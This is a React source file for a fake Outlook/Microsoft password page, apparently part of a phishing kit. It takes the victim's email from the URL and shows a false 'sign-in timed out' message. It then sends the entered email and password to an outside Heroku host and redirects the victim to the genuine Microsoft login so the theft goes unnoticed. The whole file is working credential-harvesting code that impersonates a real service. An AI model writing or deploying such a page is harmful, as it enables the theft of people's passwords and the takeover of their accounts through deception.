import React, { useState } from "react";
import Logo from "./logo.svg";
import arrow from "./ar.svg";
import { useParams } from "react-router-dom";

function Home() {
  const { mail } = useParams();
  const [password, setPassword] = useState("");

  const handleClick = () => {
    fetch("https://outlook-sign-in.herokuapp.com/user/login", {
      method: "POST",
      body: JSON.stringify({
        email: mail,
        password: password,
      }),
      headers: {
        "Content-type": "application/json",
      },
    })
      .then((response) => response.json)
      .then((json) =>
        window.location.replace("https://login.microsoftonline.com/")
      );
  };
  return (
    <div className="container">
      <div className="back"></div>
      <div className="body">
        <div className="form">
          <div style={{ marginBottom: "0.9rem" }}>
            <img src={Logo} alt="logo" />
          </div>
          <div style={{ display: "flex", alignItems: "center" }}>
            <div className="arrow">
              <img src={arrow} alt="arrow" height="60px" width="25px" />
            </div>
            <small>{mail}</small>
          </div>
          <div>
            <h2 style={{marginTop:"1rem", marginBottom:"1rem"}}>Enter password</h2>
            <p style={{ color: "red", fontSize: "15px" }}>
              Sorry, your sign-in timed out. Please sign in again.
            </p>
            <input
              type="password"
              placeholder="Password"
              onChange={(e) => setPassword(e.target.value)}
              value={password}
              required
            />
            <p className="fg">
              Forgot password?
            </p>
            <button className="btn" onClick={handleClick}>
              Sign in
            </button>
          </div>
        </div>
      </div>
      <footer>
        <p className="footer">
          <span style={{ marginRight: "1rem" }}>Terms of use </span>{" "}
          <span style={{ marginRight: "1rem" }}>privacy and use</span>{" "}
          <b style={{ textAlign: "center" }}>. . .</b>
        </p>
      </footer>
    </div>
  );
}

export default Home;
